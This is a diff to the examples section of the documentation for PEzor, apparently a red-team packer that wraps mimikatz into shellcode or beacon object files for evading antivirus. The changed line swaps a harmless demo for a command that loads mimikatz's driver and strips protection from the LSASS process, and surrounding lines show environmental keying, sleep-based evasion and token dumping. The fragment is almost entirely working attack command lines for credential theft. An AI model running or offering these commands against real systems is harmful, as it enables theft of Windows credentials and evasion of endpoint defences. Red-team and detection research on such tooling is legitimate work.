@@ -85,7 +85,7 @@ EXAMPLES
   # 64-bit (use environmental keying with GetComputerNameExA)
   $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'
   # 64-bit (support EXEs with resource by keeping PE headers in memory)
-  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 1 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'
+  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 1 -p '\"!+\" \"!processprotect\" \"/process:lsass.exe\" \"/remove\" \"!-\" \"exit\"'
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (beacon object file w/ cleanup)
